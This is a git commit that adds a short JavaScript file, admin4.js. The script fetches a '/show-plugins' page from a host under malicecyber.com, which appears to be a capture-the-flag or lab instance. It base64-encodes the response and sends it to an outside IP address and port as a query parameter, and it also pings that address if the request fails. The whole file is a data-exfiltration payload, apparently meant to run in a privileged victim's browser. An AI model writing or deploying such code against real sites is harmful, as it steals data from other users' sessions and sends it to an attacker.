fdf61cf9791cb1c7b517d5c6da30c1150e3816b1
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 07:07:32 +0100

    Create admin4.js

---
+++ admin4.js
@@ -0,0 +1,18 @@
+const url3 = 'http://website-frn49g.inst.malicecyber.com/show-plugins';
+
+// Making a GET request using fetch()
+fetch(url3)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    // Parse the response as JSON
+    return response.json();
+  })
+  .then(data => {
+    console.log(data);
+    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
+  })
+  .catch(error => {
+    fetch("http://82.65.210.151:24000/?error=true");
+  });
